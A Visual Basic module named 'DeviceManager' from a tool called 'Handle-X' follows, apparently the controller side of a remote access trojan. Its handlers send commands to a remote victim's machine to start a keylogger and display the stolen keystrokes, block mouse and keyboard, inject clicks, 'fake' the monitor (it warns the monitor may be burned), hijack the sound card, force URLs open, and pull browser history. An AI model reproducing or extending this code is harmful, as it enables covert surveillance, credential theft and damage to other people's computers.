Attribute VB_Name = "DeviceManager"
Private Const MIXERCONTROL_CONTROLTYPE_VOLUME = &H50030001
Private Const MIXERCONTROL_CONTROLTYPE_MUTE = &H20010002
Public Sub LoadDeviceManager()
    Frm_Main.txt_Hardware(6) = Date
End Sub
Public Sub DeviceManagerFunctions(Function_ID As Byte, Function_Data As String)
    '96 - 127
     Dim i As Integer
     Select Case Function_ID
            Case 96 'Get Hardware info
                Editor.SetString Function_Data, "Computer & Hardware Information"
            Case 97 'Eject CD
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 98 'Close CD
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 99 'Start Mouse & keyboard
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 100 'Stop Mouse & keyboard
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 101 'Turn-off Monitor
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 102 'Turn-On monitor
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 103 'Caps on
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 104 'Caps off
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 105 'Num on
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 106 'Num off
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 107 'Get monitor states
                If Left$(Function_Data, 1) = "F" Then 'Error Occur
                    MsgBox "Unable To Set This Settings to The Monitor at The Remoted System.", vbInformation, AppName
                Else
                    Dim Data1 As String, States() As String
                    Data1 = Mid$(Function_Data, 6)
                    States = Split(Data1, Separator_Char)
                    Frm_Main.MonitorList.Clear
                    For i = 0 To UBound(States) - 1
                        Frm_Main.MonitorList.AddItem States(i)
                    Next i
                    Frm_Main.MonitorList.ListIndex = Long_Representation(Mid$(Function_Data, 2, 4))
                End If
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 108 'Set monitor state
                If Left$(Function_Data, 1) = "F" Then 'Error Occur
                    MsgBox "Unable To Set This Settings to The Monitor at The Remoted System.", vbInformation, AppName
                End If
                If Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Setting New Monitor Settings..." Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
                End If
            Case 109 'Fake Monitor
                If Left$(Function_Data, 1) = "F" Then
                    MsgBox "Get The Monitor Settings First.", vbExclamation, AppName
                End If
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 110 'Cancel Monitor Faking
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 111 'Start Key Logger
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
                Editor.SetString "", "Keylogger DataBack"
            Case 112 'Stop Key logger
                AddText Editor.Txt_Screen, Function_Data & vbCrLf, 1
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 112 'Reserved
                
            Case 113 'Reserved
            
            Case 114 'Initialize sound card
                
            Case 115 'Take control over sound card
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 116 'Leave control over sound card
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 117 'Get sound level
                Frm_Main.txt_Hardware(0) = Int((Val(Function_Data) + 1) / 655.35)
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 118 'Set sound level
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 119 'Hide pointer
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 120 'Show pointer
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 121 'Swap Pointer
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 122 'Return normal
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 123 'Left click at
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 124 'Right click at
                Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>_"
            Case 125 'reserved
            
            Case 126
            
            Case 127
            
            
     End Select
End Sub
Public Sub DeviceManagerButtons(Index As Integer)
    Select Case Index
           Case 0 'Get Information
                If Frm_Main.Send_Data(Chr$(96)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Getting Remoted System Info..."
                End If
           Case 1 'Eject CD-Rom
                If Frm_Main.Send_Data(Chr$(97)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Ejecting CD-Rom ..."
                End If
           Case 2 'Close CD-Rom
                If Frm_Main.Send_Data(Chr$(98)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Closing CD-Rom ..."
                End If
           Case 3 'Stop Mouse & Keyboard
                If Frm_Main.Send_Data(Chr$(99)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Stopping System Inputs ..."
                End If
           Case 4 'Allow Mouse & Keyboard
                If Frm_Main.Send_Data(Chr$(100)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Allowing System Inputs ..."
                End If
           Case 5 'Turn-off monitor
                If Frm_Main.Send_Data(Chr$(101)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Turn-Off Monitor ..."
                End If
           Case 6 'Turn-ON Monitor
                If Frm_Main.Send_Data(Chr$(102)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Turn-On Monitor ..."
                End If
           Case 7 'caps on
                If Frm_Main.Send_Data(Chr$(103)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Turn-On Caps Button ..."
                End If
           Case 8 'caps off
                If Frm_Main.Send_Data(Chr$(104)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Turn-Off Caps Button ..."
                End If
           Case 9 'Num on
                If Frm_Main.Send_Data(Chr$(105)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Turn-On Num Button ..."
                End If
           Case 10 'Num off
                If Frm_Main.Send_Data(Chr$(106)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Turn-Off Num Button ..."
                End If
           Case 11 'Get Monitor resulutions
                If Frm_Main.Send_Data(Chr$(107)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Getting Monitor Settings..."
                End If
           Case 12 'Set monitor resolution
                If Frm_Main.MonitorList.ListIndex >= 0 Then
                    If Frm_Main.Send_Data(Chr$(108) & Char_Representation(Frm_Main.MonitorList.ListIndex)) = True Then
                        Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Setting New Monitor Settings..."
                    End If
                End If
           Case 13 'Fake The Monitor By Changing the monitor settings Randommly
                If MsgBox("Are You Very Sure That You Want To Do That ?" & vbCrLf & vbCrLf & "Notes:-" & vbCrLf & _
                "- The Monitor May Be Burned !" & vbCrLf & "- May Be The Remoted System's User Force The System to Shutdown , Hence You May lose The Connection!" & vbCrLf & "- May Be The Remoted System Hang up Coz' Of That." & vbCrLf & vbCrLf & _
                "So , Are You Sure To Do That Now?", vbYesNo + vbExclamation, AppName) = vbYes Then
                    If Frm_Main.Send_Data(Chr$(109)) = True Then
                        Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Faking The Remoted Monitor..."
                    End If
                End If
           Case 14 'Return Monitor As Normal
                If Frm_Main.Send_Data(Chr$(110)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Return Monitor From Faking It..."
                End If
           Case 15 'Start Keylogger
                If Frm_Main.Send_Data(Chr$(111)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Start KeyLogger ..."
                End If
           Case 16 'Stop Keylogger
                If Frm_Main.Send_Data(Chr$(112)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Stop KeyLogger ..."
                End If
           Case 17 'reserved
                
           Case 18 'Initialize sound card
                MsgBox ("The sound card is ready to be controlled" & vbCrLf & vbCrLf & "Note : To Take/Free control over the sound card , you have to set a value first"), vbInformation, AppName
           Case 19 'Take control over sound card
                If Frm_Main.Send_Data(Chr$(115)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Takking Control Over Sound Card ..."
                End If
           Case 20 'Leave control over sound card
                If Frm_Main.Send_Data(Chr$(116)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Leaving Control Over Sound Card ..."
                End If
           Case 21 'Get sound level
                If Frm_Main.Send_Data(Chr$(117)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Getting Sound Level ..."
                End If
           Case 22 'Set sounnd level
                If Frm_Main.Send_Data(Chr$(118) & 0 & " " & MIXERCONTROL_CONTROLTYPE_VOLUME & " " & Val(Frm_Main.txt_Hardware(0)) & " " & 3) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Setting Sound Level ..."
                End If
           Case 23 'Hide pointer
                If Frm_Main.Send_Data(Chr$(119)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Hidding Mouse-Pointer ..."
                End If
           Case 24 'Show pointer
                If Frm_Main.Send_Data(Chr$(120)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Showing Mouse-Pointer ..."
                End If
           Case 25 'Swap Pointer
                If Frm_Main.Send_Data(Chr$(122)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Swapping Mouse Buttons ..."
                End If
           Case 26 'Return normal
                If Frm_Main.Send_Data(Chr$(123)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Return MouseButtons To It's Normal State ..."
                End If
           Case 27 'Left click at
                If Frm_Main.Send_Data(Chr$(124) & Char_Representation(Val(Frm_Main.txt_Hardware(1))) & Char_Representation(Val(Frm_Main.txt_Hardware(3)))) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Raiseing Left-Click Event ..."
                End If
           Case 28 'Right click at
                If Frm_Main.Send_Data(Chr$(125) & Char_Representation(Val(Frm_Main.txt_Hardware(2))) & Char_Representation(Val(Frm_Main.txt_Hardware(4)))) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Raiseing Right-Click Event ..."
                End If
           Case 30  'Send URl
                If Frm_Main.Send_Data(Chr$(189) & Frm_Main.txt_Hardware(5)) = True Then
                    Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Forceing Browser To Open This Url ..."
                End If
           Case 29 'Reserved
                 
           Case 31 'Get History
                If Len(Frm_Main.txt_Hardware(6)) Then
                    If Frm_Main.Send_Data(Chr$(190) & CDate(Frm_Main.txt_Hardware(6))) = True Then
                        Frm_Main.RoomTitle(8) = "\Handle-X\Hardware Manager :\>Getting Browser Histroy At This Date..."
                    End If
                Else
                    MsgBox "Write a valid access date", vbExclamation, AppName
                End If
           Case Else
                MsgBox "This Function Isn't Supported In This Version", vbInformation, AppName
    End Select
End Sub
